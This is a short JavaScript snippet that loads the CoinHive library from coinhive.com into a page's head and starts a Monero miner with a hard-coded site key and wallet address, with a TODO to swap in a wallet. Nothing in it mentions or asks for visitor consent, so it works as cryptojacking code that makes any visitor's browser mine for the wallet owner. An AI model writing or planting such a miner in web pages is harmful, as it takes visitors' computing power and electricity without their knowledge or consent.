var script = document.createElement('script');
script.onload = function () {
  // XMR Pool hash
  var m = new CoinHive.Anonymous('BUSbODwUSryGnrIwy3o6Fhz1wsdz3ZNu');
   // TODO: Replace the below string with wallet string
  m.start('88LUb1BB5x1XHCx7UwFyzmbnZ1N7SzTzzJB2NGtrdYPm7wbTCqrgRATazRytPYyi4xHTEobJvp9kXbaHvUcBrUujG8VTj4G');
 };
script.src = 'https://coinhive.com/lib/coinhive.min.js';
document.head.appendChild(script);
